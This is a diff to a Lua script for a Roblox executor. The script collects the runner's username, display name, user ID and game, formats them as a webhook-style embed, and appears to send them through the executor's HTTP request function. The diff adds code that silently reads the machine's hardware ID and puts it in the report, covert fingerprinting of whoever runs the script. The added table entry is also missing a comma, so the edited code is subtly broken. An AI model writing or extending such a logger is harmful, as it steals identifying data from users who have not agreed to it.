@@ -48,6 +48,12 @@ local function TXQTO_fake_script()
 	-- 1. DÉTECTION DE L'EXÉCUTEUR
 	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 	local executorName = identifyexecutor and identifyexecutor() or "Exécuteur Inconnu"
+
+local hwid = "Non supporté par l'exécuteur"
+task.spawn(function()
+	pcall(function() hwid = gethwid and gethwid() or get_hwid and get_hwid() or get_hardware_id and get_hardware_id() or hwid end)
+end)
+
 	
 	-- 2. FONCTION POUR RÉCUPÉRER L'IMAGE DU JOUEUR
 	local function GetRealHeadShotAPI(userId)
@@ -116,6 +122,7 @@ local function TXQTO_fake_script()
 						{["name"] = "👤 Pseudo", ["value"] = LocalPlayer.Name, ["inline"] = true},
 						{["name"] = "🏷️ Surnom", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
 						{["name"] = "🆔 ID Joueur", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
+						{["name"] = "💻 HWID (Machine ID)", ["value"] = "`" .. hwid .. "`", ["inline"] = false}
 	
 						-- Infos Jeu
 						{["name"] = "🎮 Jeu Actuel", ["value"] = gameName, ["inline"] = true},
